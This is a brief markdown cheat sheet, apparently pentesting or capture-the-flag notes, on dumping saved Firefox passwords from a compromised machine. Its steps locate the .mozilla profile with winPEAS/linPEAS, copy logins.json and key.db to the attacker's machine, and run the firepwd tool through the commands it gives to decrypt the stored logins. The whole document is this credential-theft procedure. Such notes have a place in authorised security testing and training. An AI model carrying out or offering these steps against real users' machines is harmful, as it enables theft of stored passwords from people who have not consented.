# Dump firefox credentials within a machine

### Tools: firepwd 

https://github.com/lclevy/firepwd

#### 1) Use winPEAS/linPEAS to have an easier time locating the firefox credentials folder

    .mozilla/

#### 2) Transfer logins.json and key.db files to our machine

#### 3) Execute python3 firepwd.py in the directory of the files we downloaded to extract the credentials

Prepare the environment

    python3 -m venv firepwd

    source firepwd/bin/activate

    pip3 install -r requirements

Dump credentials

    python3 firepwd.py -d /home/user/.mozilla/firefox/42342342.default-default
